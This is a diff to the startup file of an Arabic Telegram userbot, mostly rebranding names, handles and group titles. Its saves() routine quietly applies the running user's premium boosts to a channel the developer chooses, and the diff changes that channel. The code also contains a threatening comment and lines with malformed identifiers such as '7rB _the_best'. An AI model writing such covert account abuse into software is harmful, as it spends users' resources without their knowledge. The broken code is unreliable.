@@ -130,13 +130,13 @@ async def startupmessage():
 async def mybot():
     try:
         starkbot = await l313l.tgbot.get_me()
-        joker = "7rB  🤡"
+        joker = "ألبوت المساعد"
         bot_name = starkbot.first_name
         botname = f"@{starkbot.username}"
         if bot_name.endswith("Assistant"):
             print("تم تشغيل البوت")
         if starkbot.bot_inline_placeholder:
-            print("7rB  ForEver")
+            print("Robin  ForEver")
         else:
             try:
                 await l313l.send_message("@BotFather", "/setinline")
@@ -175,7 +175,7 @@ async def add_bot_to_logger_group(chat_id):
         except Exception as e:
             LOGS.error(str(e))
 #by @k_jj_j بس اشوفك خامطه للكود اهينك وافضحك
-JoKeRUB = {"@uui7rb", "@k_jj_j", "@E_4_R"}
+JoKeRUB = {"@uui7rb", "@is7rb", "@E_4_R"}
 async def saves():
     for F_O_1 in JoKeRUB:
         try:
@@ -192,7 +192,7 @@ async def saves():
             if not slots:
                 return
             await l313l(functions.premium.ApplyBoostRequest(
-                'AljokerUserBot',
+                'Rjsssye6yyshodddiuythbuu',
                 slots=slots
             ))
         except FloodWaitError as e:
@@ -261,7 +261,7 @@ async def load_plugins(folder, extfolder=None):
             f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
         )
 
-#سورس robin  عمك
+#سورس عمك حرب
 async def robin_the_best(l313l, group_name):
     async for dialog in l313l.iter_dialogs():
         if dialog.is_group and dialog.title == group_name:
@@ -297,21 +297,21 @@ async def verifyLoggerGroup():
                 + str(e)
             )
     else:
-        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @k_jj_j"
+        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @is7rb"
         photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j.JPEG")
-        botlog_group_id = await 7rB _the_best(l313l, "مجموعة أشعارات 7rB ")
+        botlog_group_id = await Robin_the_best(l313l, "مجموعة أشعارات سورس روبن ")
         if botlog_group_id:
             addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
             print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
         else:
             _, groupid = await create_supergroup(
-                "مجموعة أشعارات 7rB ", l313l, Config.TG_BOT_USERNAME, descript, photobt
+                "مجموعة أشعارات سورس روبن", l313l, Config.TG_BOT_USERNAME, descript, photobt
             )
             addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
             print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
         flag = True
     if PM_LOGGER_GROUP_ID == -100:
-        descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @k_jj_j"
+        descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @is7rb"
         photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j2.JPEG")
         pm_logger_group_id = await 7rB _the_best(l313l, "مجموعة التخزين")
         if pm_logger_group_id:
